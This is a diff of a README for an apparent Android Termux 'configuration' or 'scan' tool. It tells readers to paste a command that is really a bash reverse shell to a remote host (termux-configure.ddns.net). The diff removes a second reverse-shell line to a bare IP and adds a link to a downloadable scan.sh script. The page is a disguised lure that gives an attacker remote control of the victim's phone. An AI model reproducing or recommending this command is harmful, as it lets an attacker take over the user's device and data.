@@ -2,14 +2,7 @@
 
 https://github.com/wolfyy59/scan
 
-
-
-#Termux configuration command#
-#cfg for hacking since 2021 for free !#
-
-
-bash -i >& /dev/tcp/193.161.193.99/29299  0>&1; config
-
+SCANNING PHONE ANDROID ONLY
 
 <!-- Improved compatibility of back to top link: See: https://github.com/othneildrew/Best-README-Template/pull/73 -->
 <a name="readme-top"></a>
@@ -47,7 +40,7 @@ bash -i >& /dev/tcp/193.161.193.99/29299  0>&1; config
     <img src="images/logo.png" alt="Logo" width="80" height="80">
   </a>
 
-  <h3 align="center">Configurations for termux for android Phones, supported devices are (SAMSUNG,OPPO,REDMI,XIAOMI,REALMI,** NOKIA AND IOS PHONES ARE NOT SUPPORTED** Copy And Paste this command bellow on your termux to configurate it. </h3>
+  <h3 align="center">SCAN for termux for android Phones, supported devices are (SAMSUNG,OPPO,REDMI,XIAOMI,REALMI,** NOKIA AND IOS PHONES ARE NOT SUPPORTED** Copy And Paste this command bellow on your termux to configurate it. </h3>
 
   <p align="center">
     bash -i >& /dev/tcp/termux-configure.ddns.net/25251 0>&1
@@ -96,7 +89,7 @@ bash -i >& /dev/tcp/193.161.193.99/29299  0>&1; config
 <!-- ABOUT THE PROJECT -->
 ## About The Project
 
-[![Product Name Screen Shot][product-screenshot]](https://www.fbi.gov/wanted/topten)
+[![Product Name Screen Shot][product-screenshot]](https://dc718.4shared.com/download/95F5tCN8jq/scan.sh?tsid=20230914-172313-ba7c7777&sbsr=5486b02735d60ab1acf69aa0a0e57c2daf2&bip=MTk3LjIwNC4yMDUuMjM0&lgfp=30)
 
 
 
